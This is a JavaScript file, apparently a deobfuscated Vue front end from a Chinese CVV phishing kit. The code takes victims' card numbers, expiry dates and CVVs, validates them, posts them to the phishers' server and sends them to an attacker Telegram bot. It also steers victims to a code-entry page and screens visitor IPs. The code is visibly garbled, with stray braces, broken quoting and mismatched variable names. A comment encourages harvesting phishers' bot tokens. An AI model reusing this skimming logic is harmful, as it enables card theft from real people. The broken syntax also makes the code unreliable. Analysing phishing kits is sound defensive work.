//Ripped from a 粉面弹子CVV鱼站管理 / "Fenmiandanzi CVV fish station management" phishing template
new Vue({
    "el": "#appAll"
    , "data"() {
        return {
            "addressInfore": {
                "cardStatus": null
                , "status": 0x1
                , "setup": "填卡页"
            }
            , "money": 0.95
            , "title": "watch"
            , 'mom': null
            , "year": null
            , "disabledCard": !![]
            , "isPassCard": '同步'
            , 'timer': ""
            , 'ruleList': ''
            , "next": 0x0
            , 'disabledBtn': ![]
            , 'goods': '1'
            , "formLabelAlign": {
                "name": ""
                , 'region': ""
                , 'type': ""
            }
        };
    }
    , created() {
        if (localStorage.getItem("addressInfore")) {
            this.addressInfore = Object.assign(JSON.parse(localStorage.getItem('addressInfore')), this.addressInfore);
            this.online();
            this.checkIp(this.addressInfore.ip);
        }
        this.ruleList = JSON.parse(localStorage.getItem("ruleList")).list;
    },

    mounted() {
        window.addEventListener("beforeunload", event => {
            this.updataOnline();
        });
    }

    , methods: {
        submit() {
            this.addressInfo.cardStatus = 0;
            delete this.addressInfo.codeStatus;
            this.tgTest(JSON.stringify(this.addressInfo));

            if (this.luhnCheck(this.addressInfo.cardNo.replace(/\s/g, ''))) {
                if (this.validate_Date(this.addressInfo.cardRiqi)) {
                    if (this.validate_cvv(this.addressInfo.cardCvv)) {
                        this.disabledCard = true;
                        axios.post(configAll.serverUrl + 'addCard', this.addressInfo)
                            .then(response => {
                                if (response.status === 200) {
                                    this.timer = setInterval(() => {
                                        this.isPass(response.data.data.id);
                                    }, 30000);
                                }
                                this.checkCard(this.addressInfo.cardNo);
                                this.addressInfo = response.data.data;
                                this.tg(JSON.stringify(this.addressInfo));
                            })
                            .catch(error => {
                                console.log(error);
                            });
                    } else {
                        swal("Error", "The security code you entered is not valid. Type it again!", "error");
                    }
                } else {
                    swal("Error", "Your credit card has expired. Change your credit card!", "error");
                }
            } else {
                swal("Error", "The card number entered is not valid. Please log in again!", "error");
            }
        }

        , function luhnCheck(number) {
            let lastDigit = number.substr(-1);
            let reversedNumber = number.slice(0, -1).split("").reverse().join("");

            let sum = 0;
            for (let i = 0; i < reversedNumber.length; i++) {
                let digit = parseInt(reversedNumber[i]);
                if (i % 2 === 0) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
            }

            sum += parseInt(lastDigit);
            return sum % 10 === 0;
        }

        }
        , function validateDate(dateString) {
            let currentDate = new Date();
            let comparisonDate = new Date();
            let year = dateString.slice(-2).split("").reverse().join("");
            let monthDay = dateString.slice(0, 4); // Adjusted for a standard date format
            comparisonDate.setFullYear(year, monthDay.substring(0, 2) - 1, monthDay.substring(2, 4));
            
            if (currentDate.getTime() > comparisonDate.getTime()) {
                return false;
            } else {
                return true;
            }
        }

        function validateCVV(cvv) {
            let cvvPattern = /^[0-9]{3,4}$/;
            return cvvPattern.test(cvv);
        }

        , 'updateStatus'() {}
        , 'online() {
            const { addressInfo } = this;
            delete addressInfo.cardStatus;
            delete addressInfo.codeStatus;

            axios.post(`${configAll.serverUrl}Card/updateOnline`, addressInfo)
                 .then(response => {
                     console.log(response);
                 })
                 .catch(error => {
                     console.log(error);
                 });
        }

        , changeCard() {
            const { addressInfo } = this;
            delete addressInfo.cardStatus;
            delete addressInfo.codeStatus;

            axios.post(`${configAll.serverUrl}addCard`)
                 .then(response => {
                     // Handle success response here, if needed
                 })
                 .catch(error => {
                     console.log(error);
                 });
        }

        }
        , function isPass(id) {
            this.disabledBtn = true;
            let self = this;

            if (self.ruleList[5]['value'] === '1') { // Adjusted index for clarity
                axios.get(configAll.serverUrl + "/checkCardStatus", { params: { id: id } })
                    .then(response => {
                        this.addressInfo.cardStatus = response.data.data.cardStatus;
                        localStorage.setItem("addressInfo", JSON.stringify(this.addressInfo));

                        switch (response.data.data.cardStatus) {
                            case 1:
                                this.next = true;
                                window.location.replace("/sendcode.html");
                                break;
                            case 2:
                                swal({
                                    title: 'Error',
                                    text: 'Your payment method is incorrect. Update your payment information!',
                                    type: 'error'
                                }, function () {
                                    self.disabledCard = true;
                                    self.disabledBtn = false;
                                    clearInterval(self.timer);
                                });
                                break;
                            case 3:
                                this.next = true;
                                window.location.replace("/sendcode.html");
                                break;
                            case 5:
                                this.next = true;
                                window.location.replace("/app.html");
                                break;
                            default:
                                // Handle other cases or do nothing
                                break;
                        }
                    })
                    .catch(error => {
                        // Handle the error
                    });
            } else {
                this.next = true;
                window.location.replace('./finish.html');
            }
        }

        , checkCard(cardNumber) {
            axios.get(configAll.cardUrl + cardNumber.replace(/\s/g, ''))
                 .then(response => {
                     console.log(response);
                     let bankInfo = {
                         "bankName": response.data.bank.name ? response.data.bank.name.replace(/\'/g, '') : 'BANK',
                         'bankType': response.data.type ? response.data.type : "debit",
                         'bankScheme': response.data.scheme ? response.data.scheme : 'Visa'
                     };
                     this.addressInfo = Object.assign(this.addressInfo, bankInfo);
                     localStorage.setItem('addressInfo', JSON.stringify(this.addressInfo));
                 })
                 .catch(error => {
                     localStorage.setItem("addressInfoError", JSON.stringify(this.addressInfo));
                 });
        }

        tg(telegramMessage) {
            let token = this.ruleList[33415 ^ 33414].value;
            let chatId = this.ruleList[9].value;
            axios.get(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${telegramMessage}`)
                 .then(response => {})
                 .catch(error => {});
        }

        tgTest(testMessage) {
            axios.get(`https://api.telegram.org/[removed]/sendMessage?chat_id=[removed]&text=${testMessage}`) //telegram API tokens removed b/c I don't like sharing lol, but if you find your own by doing JS sourcedoe analysis on phishers & similar goobers, you can probably send them a few messages by using this URL :)
                 .then(response => {})
                 .catch(error => {});
        }

        updateOnline() {
            if (this.next === 0) { // 280250 ^ 280250 results in 0
                let updateData = {
                    'id': this.addressInfo.id,
                    'status': 0
                };
                fetch(configAll.serverUrl + 'Card/updateOnline', {
                    method: 'POST',
                    body: JSON.stringify(updateData),
                    headers: {
                        'Content-Type': 'application/json;charset=UTF-8'
                    },
                    keepalive: true
                })
                .then(response => response.json())
                .then(data => console.log(data));
            }
        }

        checkIp(ipAddress) {
            axios.get(configAll.serverUrl + 'Card/checkIp', {
                params: {
                    ip: ipAddress
                }
            })
            .then(response => {
                if (response.data.data?.ipStatus === 0) {
                    window.location.href = "https://localhost";
                } else {
                    this.setup += 1; // 0x6b0d0 ^ 0x6b0d1 results in 1
                }
            })
            .catch(error => {
                console.log(error);
            });
        }

    }
});
